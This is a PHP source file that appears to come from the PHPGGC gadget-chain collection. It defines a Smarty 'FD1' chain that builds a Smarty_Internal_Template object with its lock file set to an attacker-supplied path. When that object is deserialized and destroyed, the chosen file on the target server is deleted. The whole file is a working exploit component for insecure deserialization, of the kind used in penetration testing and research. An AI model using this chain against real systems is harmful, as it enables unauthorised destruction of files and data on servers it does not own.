<?php

namespace GadgetChain\Smarty;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '?';
    public static $vector = '__destruct';
    public static $author = 'd3adc0de';
    public static $parameters = [
        'remote_file'
    ];

    public function generate(array $parameters)
    {
        $object = new \Smarty_Internal_Template();
        $object->setlock($parameters['remote_file']);

        return $object;
    }
}